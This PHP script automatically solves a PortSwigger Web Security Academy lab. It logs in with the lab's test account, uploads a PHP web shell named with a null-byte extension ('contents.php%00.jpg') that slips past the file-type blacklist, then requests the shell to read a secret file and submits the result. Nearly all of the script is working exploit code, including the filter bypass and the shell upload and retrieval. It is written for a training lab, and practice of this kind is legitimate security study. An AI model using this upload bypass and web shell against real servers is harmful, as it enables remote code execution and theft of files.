<?php

/*   This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

Lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
*/

use GuzzleHttp\Client;

require_once('../vendor/autoload.php');

/*
Get csrf token from html responses to use for future requests

@param string $html_body  An html page response in text form
@return csrf token string
*/
function parse_csrf($html_body) {
    $re = '/type="hidden" name="csrf" value="([A-Za-z0-9]*)">/m';
    preg_match($re, $html_body, $matches) or die('csrf not found' . PHP_EOL);
    return $matches[1];
}

/*
Get csrf token from html responses to use for future requests

@param string $client Established Guzzlehttp instance with base uri
@param string $method REST API verb to use. Default GET
@param string $endpoint uri sub-location. Default root page
@param string $params Guzzlehttp request parameters
@return response from the Guzzlehttp request transmission
*/
function send_request($client, $method = 'GET', $endpoint = '/', $params = array()) {
    return $client->request($method, $endpoint, $params);
}

$lab_id = '0aab006603b2114c8322730900bb00ca'; // !!!---Change based on lab id----!!!
$uri = 'https://' . $lab_id . '.web-security-academy.net';
$client = new Client([ 'base_uri' => $uri, 'cookies' => true ]); // Establish connection to base lab page, and maintain sessions for requests

//***Need to query the login page to get the csrf token to login */ 
$r1_data = ['endpoint' => '/login'];
$resp_1 = send_request($client, endpoint:$r1_data['endpoint']);

//***Use the csrf token to login as the wiener user***//
$csrf_1 = parse_csrf($resp_1->getBody());
$r2_data = [
    'endpoint' => '/login',
    'params' => [
        'form_params' => [
            'csrf' => $csrf_1,
            'username' => 'wiener',
            'password' => 'peter',
        ]
    ]
];
$resp_2 = send_request($client, 'POST', $r2_data['endpoint'], $r2_data['params']);

//***Extract 2nd csrf token for file upload sumission*//
$csrf_2 =  parse_csrf($resp_2->getBody());


/***Uupload our malicous php*/
$r3_data = [
    'endpoint' => '/my-account/avatar',
    'params' => [
        'multipart' => [
            [
                'name'     => 'user',
                'contents' => 'wiener'
            ],
            [
                'name'     => 'avatar',
                'contents' => fopen('contents.php', 'r'),
                'filename' => 'contents.php%00.jpg', // %00 is the null byte character which will cut off the .jpg part when received by the server
                // Note that this is fixed in php versions 5.3 and above
            ],
            [
                'name' => 'csrf',
                'contents' => $csrf_2
            ]
            ],
        'headers'  => ['Accept-Encoding' => 'gzip, deflate, br']
        ]
    ];
$resp_3 = send_request($client, 'POST', $r3_data['endpoint'], $r3_data['params']);

//***Get the solution flag from the malicous php file we just uploaded */
$r4_data = ['endpoint' => '/files/avatars/contents.php'];
$resp_4 = send_request($client, endpoint:$r4_data['endpoint']);
$token = $resp_4->getBody();

//***Submit flag to complete the lab */
$r5_data = [ 
    'endpoint' => '/submitSolution',
    'params' => [
        'body' => 'answer=' . trim($token)
        ]
    ];

$resp_5 = send_request($client, 'POST', $r5_data['endpoint'], $r5_data['params']);
echo $resp_5->getBody() . PHP_EOL . 'done', PHP_EOL;
?>